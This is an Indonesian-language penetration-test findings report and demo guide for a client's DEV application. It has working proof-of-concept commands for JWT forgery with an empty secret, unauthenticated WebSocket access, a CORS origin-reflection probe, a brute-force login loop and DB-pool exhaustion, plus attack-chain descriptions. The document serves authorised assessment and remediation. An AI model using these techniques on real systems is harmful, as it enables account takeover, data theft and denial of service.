# Security Findings — Demo Feasibility Analysis & PoC Guide

> **Dibuat untuk**: Presentasi client KPC — Risk Demonstration
> **Environment**: DEV — `https://ptkpc-dev.outsystems.app/KPC_WORKBENCH/`
> **Backend API**: `http://localhost:8000/api/v1` (lokal) atau URL DEV
> **Tanggal analisis**: Mei 2026

---

## 1. Ringkasan Kategorisasi Findings

| ID         | Judul                                | Severity        | Kategori Demo           | Kemudahan Reproduksi              | Script Tersedia |
| ---------- | ------------------------------------ | --------------- | ----------------------- | --------------------------------- | --------------- |
| HIGH-002   | Token tidak diinvalidasi saat logout | HIGH            | Security Exploitable    | ⭐⭐⭐⭐⭐ Sangat Mudah           | ✅ Python       |
| HIGH-005   | WebSocket tanpa autentikasi          | HIGH            | Security Exploitable    | ⭐⭐⭐⭐⭐ Sangat Mudah           | ✅ Python       |
| MEDIUM-011 | JWT secret key default kosong        | MEDIUM→CRITICAL | Security Exploitable    | ⭐⭐⭐⭐⭐ Sangat Mudah           | ✅ Python       |
| HIGH-006   | CORS wildcard + credentials          | HIGH            | Security Exploitable    | ⭐⭐⭐⭐ Mudah                    | ✅ Bash         |
| MEDIUM-009 | Tidak ada rate limiting              | MEDIUM          | Security Exploitable    | ⭐⭐⭐⭐ Mudah                    | ✅ Python       |
| HIGH-004   | DB connection pool exhaustion        | HIGH            | Performance Bottleneck  | ⭐⭐⭐⭐ Mudah                    | ✅ Python       |
| MEDIUM-007 | Auto-create user tanpa validasi      | MEDIUM          | Authorization/Auth Risk | ⭐⭐⭐ Sedang (butuh Azure guest) | ✅ Python       |
| HIGH-003   | JWT di localStorage                  | HIGH            | Easily Demonstrable     | ⭐⭐⭐⭐ Mudah (browser)          | Panduan manual  |
| HIGH-001   | PKCE state di in-memory              | HIGH            | Architecture-Level Risk | ⭐⭐ Butuh multi-instance setup   | Panduan manual  |
| MEDIUM-008 | JWKS tidak di-cache                  | MEDIUM          | Architecture-Level Risk | ⭐⭐ Butuh Azure outage simulasi  | Panduan manual  |
| MEDIUM-010 | Auth events tidak di-log             | MEDIUM          | Data Consistency Risk   | ⭐⭐⭐ Sedang (verifikasi DB)     | Panduan manual  |

---

## 2. Detail Demo per Finding

---

### HIGH-002 — Token Valid Setelah Logout

**Kategori**: Security Exploitable  
**Prioritas Demo**: 🔴 #1 — Paling mudah dan paling impactful untuk client

#### Kemudahan Reproduksi

Sangat mudah. Hanya butuh:

1. Akun test di DEV
2. Script Python atau curl
3. 2 menit demonstrasi

#### Metode Demo

```
Login → ambil token → logout → gunakan token lama → MASIH BERHASIL
```

#### Flow Demo ke Client

```
1. Tunjukkan: "Saya login sekarang"
2. Ambil token dari DevTools → Network → Bearer token
3. Klik Logout
4. Di terminal: curl -H "Authorization: Bearer TOKEN_LAMA" /api/v1/auth/me
5. Response 200 OK! → "Saya sudah logout, tapi token masih jalan"
6. Tanya client: "Kalau token ini dicuri oleh hacker, admin mau apa?"
```

#### Expected vs Actual

|                    | Expected (Aman)       | Actual (Vulnerable) |
| ------------------ | --------------------- | ------------------- |
| Setelah logout     | HTTP 401 Unauthorized | HTTP 200 OK         |
| Token di blacklist | ✓ Token invalid       | ✗ Token masih valid |
| Window of exposure | 0 detik               | 24 jam penuh        |

#### Script

```bash
# Di terminal/Postman, setelah logout:
curl -H "Authorization: Bearer SAVED_TOKEN" http://localhost:8000/api/v1/auth/me
# Jika HTTP 200 → vulnerability confirmed
```

**Script otomatis**: `poc/HIGH-002-token-still-valid-after-logout.py`

---

### HIGH-005 — WebSocket Tanpa Autentikasi

**Kategori**: Security Exploitable  
**Prioritas Demo**: 🔴 #2 — Paling dramatis untuk ditunjukkan

#### Kemudahan Reproduksi

Sangat mudah. Hanya butuh job_id dari DEV dan satu command.

#### Metode Demo

```bash
# Install wscat (Node.js WebSocket CLI)
npm install -g wscat

# Connect TANPA token ke job yang ada di DEV
wscat -c "ws://localhost:8000/ws/jobs/JOB_ID_HERE"

# Server langsung kirim data job result — tanpa login!
```

#### Flow Demo ke Client

```
1. User yang login membuat job (misalnya bid analysis)
2. Ambil job_id dari Network tab
3. Logout dari browser
4. Di terminal buka koneksi WebSocket tanpa token
5. Data bid analysis langsung diterima!
6. "Ini data tender Anda, bisa diakses siapapun yang tahu ID-nya"
```

#### Bandingkan dengan Chatbot WS (sudah aman)

```bash
# Chatbot WS — akan ditolak tanpa token
wscat -c "ws://localhost:8000/ws/chatbot/SESSION_ID"
# → Connection closed 4401 (Unauthorized)

# Jobs WS — langsung terima data
wscat -c "ws://localhost:8000/ws/jobs/JOB_ID"
# → {"type":"update","result":{...data sensitif...}}
```

**Script otomatis**: `poc/HIGH-005-websocket-no-auth.py`

---

### MEDIUM-011 — JWT Token Forgery via Empty Secret

**Kategori**: Security Exploitable  
**Prioritas Demo**: 🔴 #3 — Paling mengejutkan untuk client

> ⚠️ **CATATAN PENTING**: Finding ini HANYA aktif jika `JWT_SECRET_KEY` tidak di-set di environment variables. Verifikasi dulu di DEV sebelum demo.

#### Cara Verifikasi Apakah Aktif

```python
# Coba forge token dengan secret ""
import jwt
from datetime import datetime, timezone, timedelta

token = jwt.encode(
    {"sub": "admin@kpc.co.id", "exp": datetime.now(timezone.utc) + timedelta(hours=1)},
    "",  # secret kosong
    algorithm="HS256"
)

import requests
r = requests.get("http://localhost:8000/api/v1/auth/me",
    headers={"Authorization": f"Bearer {token}"})
print(r.status_code)  # 200 = VULNERABLE, 401 = SUDAH AMAN
```

#### Flow Demo ke Client

```
1. "Saya akan akses data admin TANPA mengetahui passwordnya"
2. 5 baris Python → token palsu untuk admin@kpc.co.id
3. curl dengan token palsu → response data user admin
4. "Dalam 30 detik, saya mendapat akses admin tanpa password"
5. Business impact: semua data invoice, kontrak, finansial bisa diakses
```

**Script otomatis**: `poc/MEDIUM-011-jwt-token-forgery.py`

---

### HIGH-006 — CORS Wildcard + Credentials

**Kategori**: Security Exploitable  
**Prioritas Demo**: 🟡 #4

#### Metode Demo

```bash
# Cek apakah server merefleksi origin attacker
curl -I \
  -H "Origin: https://attacker-site.com" \
  -H "Authorization: Bearer TOKEN" \
  http://localhost:8000/api/v1/auth/me

# Perhatikan response headers:
# Access-Control-Allow-Origin: https://attacker-site.com ← VULNERABLE
# Access-Control-Allow-Credentials: true ← berbahaya kombinasinya
```

#### Flow Demo ke Client

```
1. Tunjukkan halaman HTML sederhana di localhost:9999 (bukan KPC domain)
2. Dari halaman tersebut, fetch API KPC dengan token user
3. Response berhasil dibaca dari domain lain
4. "Hacker yang membuat website palsu bisa mencuri data Anda dari browser"
```

**Script otomatis**: `poc/HIGH-006-cors-demo.sh`

---

### MEDIUM-009 — Tidak Ada Rate Limiting

**Kategori**: Security Exploitable  
**Prioritas Demo**: 🟡 #5

#### Metode Demo

```bash
# Coba 20 password dalam 1 menit untuk satu akun
for i in {1..20}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://localhost:8000/api/v1/auth/token \
    -d "username=test@kpc.co.id&password=wrongpass$i"
  sleep 0.1  # sangat sedikit delay
done
# Semua mengembalikan 401 — tidak pernah 429 (Too Many Requests)
```

**Script otomatis**: `poc/MEDIUM-009-no-rate-limiting.py`

---

### HIGH-004 — DB Connection Pool Exhaustion

**Kategori**: Performance Bottleneck  
**Prioritas Demo**: 🟡 #6 — Impresif secara visual (error cascade)

#### Metode Demo

```python
# 6 concurrent users → sistem mulai gagal
import concurrent.futures
import requests

def hit_api():
    return requests.get("http://localhost:8000/api/v1/auth/me",
        headers={"Authorization": "Bearer TOKEN"}).status_code

with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
    results = list(ex.map(lambda _: hit_api(), range(6)))
# Beberapa request akan mengembalikan HTTP 500
```

#### Flow Demo ke Client

```
1. Buka browser → login ke DEV → buka dashboard
2. Di terminal, jalankan concurrent requests
3. Browser mulai menampilkan error 500
4. "Ini yang terjadi setiap Senin pagi saat semua orang mulai kerja"
5. Tunjukkan grafik: 5 request OK → ke-6 mulai error
```

**Script otomatis**: `poc/HIGH-004-db-pool-exhaustion.py`

---

### HIGH-003 — JWT di localStorage

**Kategori**: Easily Demonstrable  
**Prioritas Demo**: 🟡 #7 — Paling mudah dimengerti non-teknikal

#### Metode Demo (Browser DevTools — tidak butuh script)

```
1. Login ke KPC App DEV
2. Buka Developer Tools (F12)
3. Pergi ke: Application → Local Storage → http://localhost
4. Temukan key "token" atau "access_token"
5. Klik → token JWT terlihat dalam plaintext!

"Setiap extension browser, script analytics, atau kode yang di-inject
 bisa membaca token ini."
```

#### Amplifikasi: Browser Extension Demo

```javascript
// Di browser console (F12 → Console):
console.log("Token dari localStorage:", localStorage.getItem("token"));
// Token muncul — sama persis dengan yang bisa dicuri XSS attacker
```

#### Flow Demo ke Client

```
1. F12 → Application → Local Storage → tampilkan token
2. Copy token
3. Tunjukkan jwt.io → paste token → decode isinya
4. "Email Anda, role Anda, semua ada di sini — plaintext di browser"
5. Hubungkan dengan HIGH-002: "Dan token ini masih valid 24 jam setelah logout"
```

---

### MEDIUM-007 — Auto-Create User Tanpa Domain Validation

**Kategori**: Authorization/Auth Risk  
**Prioritas Demo**: 🟡 #8

#### Metode Demo

```
1. Minta IT buat satu akun guest di Azure AD tenant (vendor test)
2. Login dengan akun guest tersebut ke KPC App DEV
3. Berhasil masuk → akun baru terbuat otomatis
4. Cek database: SELECT * FROM users ORDER BY created_at DESC LIMIT 5
5. User baru ada — admin tidak mendapat notifikasi apapun
```

#### Demonstrasi Re-creation

```sql
-- Langkah demo:
-- 1. Nonaktifkan user test
UPDATE users SET is_active = false WHERE email = 'test.user@kpc.co.id';

-- 2. Login ulang dengan user tersebut via SSO
-- 3. Berhasil! Akun baru terbuat karena query hanya cari is_active=true

-- 4. Verifikasi:
SELECT id, email, is_active, created_at FROM users
WHERE email = 'test.user@kpc.co.id'
ORDER BY created_at;
-- → Ada DUA baris untuk email yang sama!
```

**Script otomatis**: `poc/MEDIUM-007-auto-create-demo.py`

---

### HIGH-001 — PKCE State di In-Memory

**Kategori**: Architecture-Level Risk  
**Prioritas Demo**: 🟢 #9 — Lebih baik dijelaskan sebagai diagram

#### Cara Menjelaskan ke Client (Tanpa Teknikal)

```
Ilustrasi: Kertas catatan di satu meja

1. Petugas A (server A) menulis catatan: "User John, sedang login, kode: abc123"
2. John pergi ke Azure untuk verifikasi
3. Azure mengembalikan John — tapi kali ini ke Petugas B (server B)
4. Petugas B: "Kode abc123? Saya tidak punya catatan ini!"
5. John: "Saya sudah verifikasi tapi tidak bisa masuk"

Ini terjadi setiap kali ada rolling deploy atau lebih dari 1 server.
```

#### Demo Ringan (Jika Ada 2 Instance)

```
1. Start 2 instance backend di port berbeda (8000 dan 8001)
2. Arahkan /get-azure-sso-url ke port 8000
3. Arahkan /callback ke port 8001
4. Login akan selalu gagal dengan "Invalid or expired state"
```

---

### MEDIUM-008 — JWKS Tidak Di-Cache

**Kategori**: Architecture-Level Risk  
**Cara Demo**: Demonstrasikan dengan simulasi latency

```python
# Simulasi: ukur waktu login dengan vs tanpa caching
import time, requests

start = time.time()
# Login (setiap login = 1 HTTP request ke Azure JWKS)
resp = requests.post(f"{API_BASE}/auth/token", data={...})
print(f"Login time: {time.time()-start:.3f}s")

# Tunjukkan bahwa waktu login tergantung latency ke Microsoft
# Jika Azure lambat → login lambat
# Jika Azure down → login gagal 100%
```

---

### MEDIUM-010 — Auth Events Tidak Di-Log

**Kategori**: Data Consistency Risk  
**Cara Demo**: Database query verification

```sql
-- Setelah demo login/logout beberapa kali:
SELECT * FROM tracking.user_activity_logs
WHERE action IN ('login', 'logout', 'login_failed')
ORDER BY created_at DESC
LIMIT 20;
-- → Tidak ada record → Tidak ada audit trail

-- Bandingkan dengan non-auth actions yang sudah di-log:
SELECT action, COUNT(*) FROM tracking.user_activity_logs
GROUP BY action
ORDER BY count DESC;
```

---

## 3. Prioritas Demo ke Client

### Tier 1 — Demo WAJIB (High Impact, Mudah Dimengerti)

| Urutan | Finding                                   | Waktu Demo | Pesan untuk Client                     |
| ------ | ----------------------------------------- | ---------- | -------------------------------------- |
| 1      | **HIGH-003** — Token di localStorage      | 2 menit    | "Token Anda terlihat jelas di browser" |
| 2      | **HIGH-002** — Token valid setelah logout | 3 menit    | "Logout tidak melindungi Anda"         |
| 3      | **HIGH-005** — WebSocket tanpa auth       | 3 menit    | "Data invoice bisa dibaca tanpa login" |
| 4      | **MEDIUM-011** — Token forgery            | 2 menit    | "5 baris kode = akses admin"           |

### Tier 2 — Demo DIREKOMENDASIKAN (Medium Impact)

| Urutan | Finding                           | Waktu Demo | Pesan untuk Client                       |
| ------ | --------------------------------- | ---------- | ---------------------------------------- |
| 5      | **HIGH-004** — DB pool exhaustion | 5 menit    | "6 orang login bersamaan = server error" |
| 6      | **MEDIUM-009** — No rate limiting | 3 menit    | "Brute force tanpa halangan"             |
| 7      | **HIGH-006** — CORS wildcard      | 3 menit    | "Website manapun bisa akses API Anda"    |

### Tier 3 — Cukup Dijelaskan (Architecture Risk)

| Finding                        | Cara Presentasi                      |
| ------------------------------ | ------------------------------------ |
| **HIGH-001** — PKCE in-memory  | Diagram/whiteboard + skenario deploy |
| **MEDIUM-007** — Auto-create   | SQL query di DEV database            |
| **MEDIUM-008** — JWKS no cache | Response time measurement            |
| **MEDIUM-010** — No audit log  | SQL query menunjukkan kekosongan log |

---

## 4. Risk Chain — Kombinasi Terburuk

### Attack Chain #1 — Token Theft to Full Breach

```
HIGH-003 (token di localStorage)
    → HIGH-002 (token tidak bisa direvoke)
    → HIGH-005 (akses job results tanpa auth)

DAMPAK: Attacker mencuri token via XSS → logout tidak membantu →
        Akses data invoice, bid, negosiasi selama 24 jam penuh
```

### Attack Chain #2 — Unauthenticated Full Admin Access

```
MEDIUM-011 (JWT secret kosong)
    → HIGH-002 (token 24 jam, tidak bisa direvoke)
    → MEDIUM-010 (tidak ada audit log)

DAMPAK: Attacker forge token admin → akses penuh ke semua data →
        Tidak ada jejak di log → incident response tidak bisa trace
```

### Attack Chain #3 — DoS via Auth Endpoints

```
HIGH-001 (PKCE state in-memory)
    + MEDIUM-009 (tidak ada rate limiting)
    + HIGH-004 (DB pool exhaustion)

DAMPAK: Flood /get-azure-sso-url → habiskan RAM →
        Semua user tidak bisa login → sistem mati efektif
```

---

## 5. Demo Safety Checklist

Sebelum melakukan demo, pastikan:

- [ ] Menggunakan **environment DEV** — bukan production
- [ ] Menggunakan **akun test khusus** — bukan akun karyawan aktif
- [ ] Semua script menggunakan **GET/read-only** requests
- [ ] DB pool test menggunakan `--safe-mode` flag
- [ ] Tidak menyimpan/mendistribusikan output yang berisi data karyawan KPC
- [ ] Rate limiting test dibatasi maksimal 50 requests (bukan ribuan)
- [ ] Token forgery test hanya terhadap akun test, bukan admin production
- [ ] WebSocket demo menggunakan job_id dari sesi test sendiri

---

## 6. Script Quick Start

### Setup

```bash
cd findings/poc/
pip install requests websockets PyJWT
```

### Demo Sequence (30 menit)

```bash
# 1. Siapkan token dari login DEV
TOKEN="eyJ..." # ambil dari DevTools atau login manual

# 2. HIGH-002: Token valid setelah logout (~5 menit)
python HIGH-002-token-still-valid-after-logout.py

# 3. HIGH-005: WebSocket tanpa auth (~5 menit)
python HIGH-005-websocket-no-auth.py

# 4. MEDIUM-011: Token forgery (~3 menit)
python MEDIUM-011-jwt-token-forgery.py

# 5. HIGH-006: CORS demo (~3 menit)
bash HIGH-006-cors-demo.sh http://localhost:8000 $TOKEN

# 6. HIGH-004: DB pool exhaustion (~10 menit)
python HIGH-004-db-pool-exhaustion.py --safe-mode --token $TOKEN

# 7. MEDIUM-009: Rate limiting (~5 menit)
python MEDIUM-009-no-rate-limiting.py --mode both --attempts 10
```

---

## 7. Penjelasan Bisnis untuk Stakeholder Non-Teknikal

### HIGH-002 (Token valid setelah logout)

> "Bayangkan Anda keluar dari kantor dan menyerahkan kunci kepada satpam. Tapi satpam tidak menonaktifkan kunci lama Anda. Jika kunci tersebut sebelumnya telah disalin orang lain, mereka masih bisa masuk kantor meski Anda sudah keluar."

### HIGH-005 (WebSocket tanpa auth)

> "Ada pintu belakang di sistem yang tidak dikunci. Siapapun yang tahu nomor pintunya bisa langsung masuk dan membaca semua dokumen tender dan invoice tanpa harus login."

### MEDIUM-011 (JWT secret kosong)

> "Ini seperti gembok yang kuncinya adalah string kosong — semua orang yang tahu cara membuat kunci palsu bisa masuk tanpa izin. Dan membuat kunci palsu ini hanya butuh 5 baris kode."

### HIGH-004 (DB pool exhaustion)

> "Sistem ini hanya punya 5 kasir (koneksi database), tapi setiap pelanggan butuh 3 kasir sekaligus. Jadi kalau ada lebih dari 5 orang datang bersamaan, antrian langsung macet dan semua pelanggan baru mendapat error."

### HIGH-006 (CORS wildcard)

> "Saat ini sistem Anda mengizinkan website manapun di internet untuk 'berbicara' ke server KPC atas nama pengguna yang sedang login. Seperti membiarkan semua orang masuk ke kantor hanya karena mereka menunjukkan kartu nama yang menyebut nama KPC."

### HIGH-001 (PKCE in-memory)

> "Sistem login Anda seperti penjaga yang menulis catatan di selembar kertas. Kalau ada dua penjaga (dua server), masing-masing punya catatan berbeda. Kalau pengguna dilayani penjaga berbeda saat kembali, catatannya tidak ditemukan dan login gagal."

---

## 8. Rekomendasi Urutan Perbaikan

| Prioritas | Finding                         | Effort   | Impact   |
| --------- | ------------------------------- | -------- | -------- |
| 🔴 P0     | MEDIUM-011 — Set JWT_SECRET_KEY | 30 menit | CRITICAL |
| 🔴 P1     | HIGH-005 — WebSocket auth       | 2 jam    | HIGH     |
| 🔴 P2     | HIGH-002 — Token blacklist      | 1 hari   | HIGH     |
| 🔴 P3     | HIGH-006 — CORS whitelist       | 1 jam    | HIGH     |
| 🟡 P4     | HIGH-004 — Session refactor     | 1 hari   | HIGH     |
| 🟡 P5     | MEDIUM-009 — Rate limiting      | 4 jam    | MEDIUM   |
| 🟡 P6     | HIGH-001 — Redis untuk PKCE     | 4 jam    | HIGH     |
| 🟡 P7     | MEDIUM-007 — Domain validation  | 2 jam    | MEDIUM   |
| 🟢 P8     | HIGH-003 — HttpOnly cookies     | 1-2 hari | HIGH     |
| 🟢 P9     | MEDIUM-008 — JWKS caching       | 2 jam    | MEDIUM   |
| 🟢 P10    | MEDIUM-010 — Auth event logging | 4 jam    | MEDIUM   |
